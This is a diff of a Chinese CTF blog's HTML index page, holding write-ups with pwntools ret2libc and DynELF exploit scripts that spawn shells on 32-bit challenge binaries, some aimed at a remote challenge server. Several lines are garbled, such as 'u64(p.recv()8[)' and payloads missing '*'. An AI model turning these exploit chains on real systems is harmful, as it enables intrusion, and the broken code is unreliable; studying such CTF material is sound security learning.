class="line">io.recvuntil(<span class="string">"5. exit\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># write  system_addr  0x08048450</span></span><br><span class="line"> </span><br><span class="line">write_addr(leave_offset,0X50)</span><br><span class="line">write_addr(leave_offset+1,0X84)</span><br><span class="line">write_addr(leave_offset+2,0X04)</span><br><span class="line">write_addr(leave_offset+3,0X08)</span><br><span class="line"><span class="comment"># sh_addr  0x08048987</span></span><br><span class="line">leave_offset+=8</span><br><span class="line"><span class="built_in">print</span> leave_offset</span><br><span class="line">write_addr(leave_offset,0x87)</span><br><span class="line">write_addr(leave_offset+1,0X89)</span><br><span class="line">write_addr(leave_offset+2,0X04)</span><br><span class="line">write_addr(leave_offset+3,0X08)</span><br><span class="line"> </span><br><span class="line">io.sendline(<span class="string">"5"</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/28/rop2/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -514,7 +833,7 @@
 
 <h3 id="0x03-攻击"><a href="#0x03-攻击" class="headerlink" title="0x03 攻击"></a>0x03 攻击</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">先泄露write函数真实地址，构造rop链为：</span><br><span class="line"></span><br><span class="line">第一项：padding</span><br><span class="line"></span><br><span class="line">第二项：write函数的plt地址</span><br><span class="line"></span><br><span class="line">第三项(write函数参数1)：数字1，write函数第一个参数</span><br><span class="line"></span><br><span class="line">第四项(write函数参数2 输出的内容)：write函数的got地址</span><br><span class="line"></span><br><span class="line">第五项(write函数参数3 输出的长度)：数字4，表示输出4个字节的地址</span><br><span class="line"></span><br><span class="line">第六项： main函数的地址，为了让write函数输出结束后，再执行一遍main函数，进行第二波溢出。</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">elf=ELF(<span class="string">'/home/xfgg/Downloads/rop'</span>)</span><br><span class="line">plt_write=elf.plt[<span class="string">'write'</span>]</span><br><span class="line">got_write=elf.got[<span class="string">'write'</span>]</span><br><span class="line"></span><br><span class="line">main_addr=0x80484c6</span><br><span class="line">payload1=<span class="string">'a'</span>*140+p32(plt_write)+p32(main_addr)+p32(1)+p32(got_write)+p32(4)+p32(main_addr)</span><br><span class="line">p=process(<span class="string">'/home/xfgg/Downloads/rop'</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">write_real=u32(p.recv())</span><br><span class="line"></span><br><span class="line">得到write函数的真实地址后，开始计算Libc地址和system函数地址：</span><br><span class="line"></span><br><span class="line">libc地址 = write函数真实地址 - write函数的offset</span><br><span class="line"></span><br><span class="line">（write函数的offset用/bin/sh的方法，偏移是:0xd43c0）</span><br><span class="line"></span><br><span class="line">system真实地址 = libc地址 + system函数offset</span><br><span class="line"></span><br><span class="line">bin_sh真实地址  = libc地址 + /bin/sh偏移地址offset</span><br><span class="line"></span><br><span class="line">write_offset = 0xd43c0</span><br><span class="line">libc_addr = write_real - write_offset</span><br><span class="line">system_addr = libc_addr + 0x3a940</span><br><span class="line">binsh_addr = libc_addr + 0x15902b</span><br><span class="line"></span><br><span class="line">第一项：140长度的padding</span><br><span class="line">第二项：system函数真实地址</span><br><span class="line">第三项：/bin/sh的真实地址</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">'a'</span>*140+p32(system_addr) + p32(main_addr) + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">elf=ELF(<span class="string">'/home/xfgg/Desktop/rop'</span>)</span><br><span class="line">p=process(<span class="string">'/home/xfgg/Desktop/rop'</span>)</span><br><span class="line">plt_write=elf.plt[<span class="string">'write'</span>]</span><br><span class="line">got_write=elf.got[<span class="string">'write'</span>]</span><br><span class="line"></span><br><span class="line">main_addr=0x80484c6</span><br><span class="line">payload1=<span class="string">'a'</span>*140+p32(plt_write)+p32(main_addr)+p32(1)+p32(got_write)+p32(4)+p32(main_addr)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">write_real=u32(p.recv())</span><br><span class="line">write_offset = 0xd43c0</span><br><span class="line">libc_addr = write_real - write_offset</span><br><span class="line">system_addr = libc_addr + 0x3a940</span><br><span class="line">binsh_addr = libc_addr + 0x15902b</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">'a'</span>*140+p32(system_addr) + p32(main_addr) + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">elf=ELF(<span class="string">'/home/xfgg/Desktop/rop'</span>)</span><br><span class="line">p=process(<span class="string">'/home/xfgg/Desktop/rop'</span>)</span><br><span class="line">plt_write=elf.plt[<span class="string">'write'</span>]</span><br><span class="line">got_write=elf.got[<span class="string">'write'</span>]</span><br><span class="line"></span><br><span class="line">main_addr=0x80484c6</span><br><span class="line">payload1=<span class="string">'a'</span>*140+p32(plt_write)+p32(main_addr)+p32(1)+p32(got_write)+p32(4)+p32(main_addr)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">write_real=u64(p.recv()8[)</span><br><span class="line">write_offset = 0xd43c0</span><br><span class="line">libc_addr = write_real - write_offset</span><br><span class="line">system_addr = libc_addr + 0x3a940</span><br><span class="line">binsh_addr = libc_addr + 0x15902b</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">'a'</span>*140+p32(system_addr) + p32(main_addr) + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
           
         
       
@@ -1285,11 +1604,11 @@
           
             <h3 id="0x01-寻找漏洞"><a href="#0x01-寻找漏洞" class="headerlink" title="0x01 寻找漏洞"></a>0x01 寻找漏洞</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">xfgg@ubuntu:~/Downloads$ checksec level3</span><br><span class="line">[*] <span class="string">'/home/xfgg/Downloads/level3'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">只有nx保护</span><br><span class="line"></span><br><span class="line">ida分析</span><br><span class="line"></span><br><span class="line">ssize_t vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">char buf; // [esp+0h] [ebp-88h]</span><br><span class="line"></span><br><span class="line">write(1, <span class="string">"Input:\n"</span>, 7u);</span><br><span class="line"><span class="built_in">return</span> <span class="built_in">read</span>(0, &amp;buf, 0x100u);</span><br><span class="line">&#125;</span><br><span class="line">很明显的栈溢出漏洞，但是没有system函数和/bin/sh字符串了 这里有一个新的模式，泄露函数got表中的地址获取到库中某个函数的真正加载地址，通过偏移找出函数的库，通过然后找出其他函数的真正加载地址，包括system函数也包括/bin/sh字符串</span><br><span class="line"></span><br><span class="line">xfgg@ubuntu:~/Downloads$ ROPgadget --binary level3 --only <span class="string">"pop|ret"</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x0804851b : pop ebp ; ret</span><br><span class="line">0x08048518 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080482f1 : pop ebx ; ret</span><br><span class="line">0x0804851a : pop edi ; pop ebp ; ret</span><br><span class="line">0x08048519 : pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080482da : ret</span><br><span class="line">0x080483ce : ret 0xeac1</span><br><span class="line"></span><br><span class="line">我们选中这里作为ROP的位置</span><br><span class="line">0x08048519 : pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080482da : ret</span><br><span class="line">0x080483ce : ret 0xeac1</span><br></pre></td></tr></table></figure>
 
-<h3 id="0x02-思路分析"><a href="#0x02-思路分析" class="headerlink" title="0x02 思路分析"></a>0x02 思路分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">构造payload: payload=’A’0x88+’A’4+p32(plt_write)+p32(main_addr)+p32(1)+p32(got_write)+p32(4)</span><br><span class="line"></span><br><span class="line">这一部分是为了泄露出来write 函数的got表内容 payload = “A” 0x88 + “A” 4 + p32(plt_read) + p32(pop_pop_pop_ret) + p32(0) + p32(bss_addr) + p32(8)</span><br><span class="line"></span><br><span class="line">这一部分会返等待输入，把输入的内容放到bss_addr。返回地址pop_pop_pop_ret保证堆栈平衡 payload+=p32(system_addr)+p32(0x77777777)+p32(bin_sh_addr)</span><br><span class="line"></span><br><span class="line">这一部分是为了执行system(“/bin/sh”)函数。会执行system(<span class="string">"/bin/sh"</span>)是因为发送过去的payload在函数返回时才会起作用</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">pop_pop_pop_ret=0x08048519</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">"/home/xfgg/level3"</span>) <span class="comment">##载入level3程序</span></span><br><span class="line"></span><br><span class="line">plt_write=elf.plt[<span class="string">"write"</span>]</span><br><span class="line">got_write=elf.got[<span class="string">"write"</span>]</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">"111.198.29.45"</span>,41869)</span><br><span class="line"><span class="comment">##获取level3的write的plt表和got表</span></span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line"><span class="comment">##因为程序中调用了write()函数，write()函数是从Libc中动态调用的，所以，我们可以根据write()在libc中的地址通过偏移泄露出##libc的版本</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"A"</span>0x88+<span class="string">"A"</span>4+p32(plt_write)+p32(pop_pop_pop_ret)+p32(1)+p32(got_write)+p32(4)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_addr=u32(p.recv(4))</span><br><span class="line"></span><br><span class="line"><span class="comment">## u32():表示unsigned long int,而且只接受4字节就够用了</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">"write_addr="</span>+hex(write_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">##这里泄露libc的版本，运行这段代码就能获取到write函数的运行地址(放在write_addr里面)。 运行结果为write_addr=0xf7dfad80为了获取到libc版本这里推荐一个网站https://libc.blukat.me/?q=write%3A0x7f2179c14440。可以在这里通过函数名和地址查询出运行库的版本也提供下载。（如果一个地址查到不止一个库版本可以试着再泄露一个函数) 当然也可以自动获取，这个更可靠，pwntools提供的有库LibcSearcher。由于本人的电脑重装，还没安这个库，所以，没有直接用，而是跟LibcSearcher一样的方式，先泄露然后查找</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##我选择的是libcsearcher</span></span><br></pre></td></tr></table></figure>
+<h3 id="0x02-思路分析"><a href="#0x02-思路分析" class="headerlink" title="0x02 思路分析"></a>0x02 思路分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">构造payload: payload=’A’0x88+’A’4+p32(plt_write)+p32(main_addr)+p32(1)+p32(got_write)+p32(4)</span><br><span class="line"></span><br><span class="line">这一部分是为了泄露出来write 函数的got表内容 payload = “A” 0x88 + “A” 4 + p32(plt_read) + p32(pop_pop_pop_ret) + p32(0) + p32(bss_addr) + p32(8)</span><br><span class="line"></span><br><span class="line">这一部分会返等待输入，把输入的内容放到bss_addr。返回地址pop_pop_pop_ret保证堆栈平衡 payload+=p32(system_addr)+p32(0x77777777)+p32(bin_sh_addr)</span><br><span class="line"></span><br><span class="line">这一部分是为了执行system(“/bin/sh”)函数。会执行system(<span class="string">"/bin/sh"</span>)是因为发送过去的payload在函数返回时才会起作用</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">pop_pop_pop_ret=0x08048519</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">"/home/xfgg/level3"</span>) <span class="comment">##载入level3程序</span></span><br><span class="line"></span><br><span class="line">plt_write=elf.plt[<span class="string">"write"</span>]</span><br><span class="line">got_write=elf.got[<span class="string">"write"</span>]</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">"111.198.29.45"</span>,41869)</span><br><span class="line"><span class="comment">##获取level3的write的plt表和got表</span></span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line"><span class="comment">##因为程序中调用了write()函数，write()函数是从Libc中动态调用的，所以，我们可以根据write()在libc中的地址通过偏移泄露出##libc的版本</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"A"</span>0x88+<span class="string">"A"</span>4+p32(plt_write)+p32(pop_pop_pop_ret)+p32(1)+p32(got_write)+p32(4)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_addr=u32(p.recv(4))</span><br><span class="line"></span><br><span class="line"><span class="comment">## u32():表示unsigned long int,而且只接受4字节就够用了</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">"write_addr="</span>+hex(write_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">##这里泄露libc的版本，运行这段代码就能获取到write函数的运行地址(放在write_addr里面)。 运行结果为write_addr=0xf7dfad80为了获取到libc版本这里推荐一个网站https://libc.blukat.me/?q=write%3A0x7f2179c14440。可以在这里通过函数名和地址查询出运行库的版本也提供下载。（如果一个地址查到不止一个库版本可以试着再泄露一个函数) 当然也可以自动获取，这个更可靠，pwntools提供的有库LibcSearcher。由于本人的电脑重装，还没安这个库，所以，没有直接用，而是跟LibcSearcher一样的方式，先泄露然后查找</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="0x03-攻击"><a href="#0x03-攻击" class="headerlink" title="0x03 攻击"></a>0x03 攻击</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">write函数和libc泄露，写入system(<span class="string">'/bin/sh'</span>)</span><br></pre></td></tr></table></figure>
+<h3 id="0x03-攻击"><a href="#0x03-攻击" class="headerlink" title="0x03 攻击"></a>0x03 攻击</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">write函数和libc泄露，写入system(<span class="string">'/bin/sh'</span>) 最好使用dynelf模块</span><br></pre></td></tr></table></figure>
 
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">pop_pop_pop_ret=0x08048519</span><br><span class="line">elf=ELF(<span class="string">"/home/xfgg/level3"</span>)</span><br><span class="line">main_addr=0x08048484</span><br><span class="line">plt_write=elf.plt[<span class="string">"write"</span>]</span><br><span class="line"></span><br><span class="line">def leak(address):</span><br><span class="line">p.recvline()</span><br><span class="line">payload = <span class="string">"A"</span> 0x88 + <span class="string">"A"</span> 4 + p32(plt_write) + p32(main_addr) + p32(1) + p32(address) + p32(4)</span><br><span class="line">p.send(payload)</span><br><span class="line">data=p.recv(4)</span><br><span class="line"><span class="built_in">print</span> hex(u32(data))</span><br><span class="line"><span class="built_in">print</span> <span class="string">"%#x =&gt; %s"</span> % (address,(data or <span class="string">''</span>).encode(<span class="string">'hex'</span>))</span><br><span class="line"><span class="built_in">return</span> data</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">"111.198.29.45"</span>,41869)</span><br><span class="line"></span><br><span class="line">d=DynELF(leak,elf=ELF(<span class="string">"./level3"</span>))</span><br><span class="line">system_addr=d.lookup(<span class="string">'system'</span>,<span class="string">'libc'</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">"system_addr="</span>+hex(system_addr)</span><br><span class="line"></span><br><span class="line">bss_addr=0x0804a024</span><br><span class="line">plt_read=elf.plt[<span class="string">"read"</span>]</span><br><span class="line">p.recvline()</span><br><span class="line">sleep(1)</span><br><span class="line">payload = <span class="string">"A"</span> 0x88 + <span class="string">"A"</span> 4 + p32(plt_read) + p32(pop_pop_pop_ret) + p32(0) + p32(bss_addr) + p32(8)</span><br><span class="line">payload+=p32(system_addr)+p32(0x77777777)+p32(bss_addr)</span><br><span class="line"></span><br><span class="line">raw_input() <span class="comment">##raw_input():获取控制台的输入因为前面睡了一秒，所以，通过raw_input()获得控制台的输入，然后输入payload</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">"/bin/sh"</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line">不知道为什么失败了 ，这种题目还是要多做，有点难搞</span><br></pre></td></tr></table></figure>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"/home/xfgg/Downloads/level3"</span>)</span><br><span class="line">plt_write = elf.symbols[<span class="string">'write'</span>]</span><br><span class="line">plt_read = elf.symbols[<span class="string">'read'</span>]</span><br><span class="line">main_addr = 0x08048484</span><br><span class="line"></span><br><span class="line">def leak(address):</span><br><span class="line">	p.recvline()</span><br><span class="line">	payload1 = <span class="string">"a"</span>*0x88+<span class="string">"a"</span>*4+p32(plt_write)+p32(main_addr)+p32(1)+p32(address)+p32(4)</span><br><span class="line">	p.sendline(payload1)</span><br><span class="line">	date = p.recv(4)</span><br><span class="line">	<span class="built_in">print</span> <span class="string">"%#x =&gt; %s"</span> % (address,(date or <span class="string">''</span>).encode(<span class="string">'hex'</span>))</span><br><span class="line">        <span class="built_in">return</span> date</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'111.198.29.45'</span>,57881)</span><br><span class="line">d = DynELF(leak,elf=ELF(<span class="string">"/home/xfgg/Downloads/level3"</span>))</span><br><span class="line">system_addr = d.lookup(<span class="string">'system'</span>,<span class="string">'libc'</span>)</span><br><span class="line"></span><br><span class="line">bss_addr = 0x0804a024</span><br><span class="line">pop_addr = 0x08048519</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">"a"</span>*140+p32(plt_read)+p32(pop_addr)+p32(0)+p32(bss_addr)+p32(8)</span><br><span class="line">payload2 +=p32(system_addr)+p32(main_addr)+p32(bss_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.sendline(<span class="string">"/bin/sh"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
           
         
       
@@ -1469,307 +1788,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/27/forgot/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="xfgg">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="xfgg">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/07/27/forgot/" itemprop="url">forgot</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-27T19:02:27+08:00">
-                2019-07-27
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/攻防世界/" itemprop="url" rel="index">
-                    <span itemprop="name">攻防世界</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h3 id="0x01-寻找漏洞"><a href="#0x01-寻找漏洞" class="headerlink" title="0x01 寻找漏洞"></a>0x01 寻找漏洞</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">xfgg@ubuntu:~/Downloads$ checksec forgot</span><br><span class="line">[*] <span class="string">'/home/xfgg/Downloads/forgot'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line"></span><br><span class="line">只开启了nx保护</span><br><span class="line"></span><br><span class="line">ida分析</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img-blog.csdnimg.cn/20190708074114251.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMTg5NzU3,size_16,color_FFFFFF,t_70" alt></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">发现有两处溢出点</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img-blog.csdnimg.cn/20190708074419714.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMTg5NzU3,size_16,color_FFFFFF,t_70" alt></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可以观察到箭头处是个函数指针，&amp;v3 是v3在栈上的地址，&amp;v3 + --v14 是根据&amp;v3在栈上移动，上面的<span class="keyword">for</span>循环是用来改变v14的值，根据溢出点函数指针v3到v12 ，变量v14都可以被我们控制，接下来再找找有没有system函数</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img-blog.csdnimg.cn/20190708075022550.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMTg5NzU3,size_16,color_FFFFFF,t_70" alt></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">发现目标函数</span><br></pre></td></tr></table></figure>
-
